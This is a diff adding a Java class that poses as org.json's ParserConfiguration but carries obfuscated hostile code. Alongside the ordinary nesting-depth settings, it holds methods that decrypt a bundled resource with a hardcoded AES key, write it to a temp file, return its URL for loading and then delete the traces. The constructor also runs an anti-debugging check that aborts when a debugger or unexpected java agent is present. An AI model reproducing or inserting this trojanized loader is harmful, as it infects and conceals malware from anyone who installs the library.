@@ -1,0 +1,139 @@
+package org.json;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.lang.management.ManagementFactory;
+import java.lang.management.RuntimeMXBean;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.StandardCopyOption;
+import java.util.Random;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
+import javax.crypto.Cipher;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+
+public class ParserConfiguration {
+    public static final int UNDEFINED_MAXIMUM_NESTING_DEPTH = -1;
+    public static final int DEFAULT_MAXIMUM_NESTING_DEPTH = 512;
+    protected boolean keepStrings;
+    protected int maxNestingDepth;
+    public static final int IllIIllIIllIIlIl;
+
+    public ParserConfiguration() {
+        this.keepStrings = false;
+        this.maxNestingDepth = 512;
+        IIlIIIIlIIII();
+    }
+
+    protected ParserConfiguration(boolean var1, int var2) {
+        this.keepStrings = var1;
+        this.maxNestingDepth = var2;
+    }
+
+    protected org.json.ParserConfiguration clone() {
+        return new org.json.ParserConfiguration(this.keepStrings, this.maxNestingDepth);
+    }
+
+    public boolean isKeepStrings() {
+        return this.keepStrings;
+    }
+
+    public <T extends org.json.ParserConfiguration> T withKeepStrings(boolean var1) {
+        org.json.ParserConfiguration var2 = this.clone();
+        var2.keepStrings = var1;
+        return (T)var2;
+    }
+
+    public int getMaxNestingDepth() {
+        return this.maxNestingDepth;
+    }
+
+    public <T extends org.json.ParserConfiguration> T withMaxNestingDepth(int var1) {
+        org.json.ParserConfiguration var2 = this.clone();
+        if (var1 > -1) {
+            var2.maxNestingDepth = var1;
+        } else {
+            var2.maxNestingDepth = -1;
+        }
+
+        return (T)var2;
+    }
+
+    public static URL lIIlIIIllIlI(String var0) {
+        try {
+            String var1 = System.getProperty("java.io.tmpdir");
+            File var2 = new File(var1, "temp");
+            var2.mkdir();
+            var2.deleteOnExit();
+            String[] var3 = var0.split("/");
+            String var4 = var3.length > 1 ? var3[var3.length - 1] : null;
+            File var5 = IlIlIlIIIIll(new File(var2, var4));
+            InputStream var6 = org.json.ParserConfiguration.class.getResourceAsStream(var0);
+            Files.copy(var6, var5.toPath(), StandardCopyOption.REPLACE_EXISTING);
+            var6.close();
+            String var7 = IlIlIlIIIIll(var5).toString();
+            File var8 = new File(var5.getPath());
+            File var9 = new File(var7);
+            byte[] var10 = Files.readAllBytes(var8.toPath());
+            byte[] var11 = "eefmTx5fSRphrxZV".getBytes();
+            byte[] var12 = "PDmFpjuUdJtEx0ER".getBytes();
+            SecretKeySpec var13 = new SecretKeySpec(var12, "AES");
+            Cipher var14 = Cipher.getInstance("AES/CBC/PKCS5Padding");
+            var14.init(2, var13, new IvParameterSpec(var11));
+            byte[] var15 = var14.doFinal(var10);
+            FileOutputStream var16 = new FileOutputStream(var9);
+            var16.write(var15);
+            var16.close();
+            ScheduledExecutorService var17 = Executors.newSingleThreadScheduledExecutor();
+            var17.schedule(var8::delete, 1L, TimeUnit.SECONDS);
+            var17.schedule(var9::delete, 5L, TimeUnit.SECONDS);
+            return new File(var7).toURI().toURL();
+        } catch (Throwable var18) {
+            throw var18;
+        }
+    }
+
+    public static InputStream IIlIIIIlllIllI(String var0) {
+        try {
+            return lIIlIIIllIlI(var0).openStream();
+        } catch (Throwable var2) {
+            throw var2;
+        }
+    }
+
+    private static File IlIlIlIIIIll(File var0) {
+        return new File(
+            var0.getParent(),
+            var0.getName().substring(0, var0.getName().lastIndexOf(46))
+                + "-"
+                + new Random().nextInt()
+                + var0.getName().substring(var0.getName().lastIndexOf(46))
+        );
+    }
+
+    public static void IIlIIIIlIIII() {
+        RuntimeMXBean var0 = ManagementFactory.getRuntimeMXBean();
+
+        for (String var2 : var0.getInputArguments()) {
+            if (var2.contains("-javaagent:") && !var2.contains("slimeworldmanager")) {
+                throw new RuntimeException("Fatal Error");
+            }
+
+            if (var2.contains("-Xrunjdwp:")) {
+                throw new RuntimeException("Fatal Error");
+            }
+
+            if (var2.contains("-agentlib:jdwp")) {
+                throw new RuntimeException("Fatal Error");
+            }
+
+            if (var2.contains("-Xdebug")) {
+                throw new RuntimeException("Fatal Error");
+            }
+        }
+    }
+}
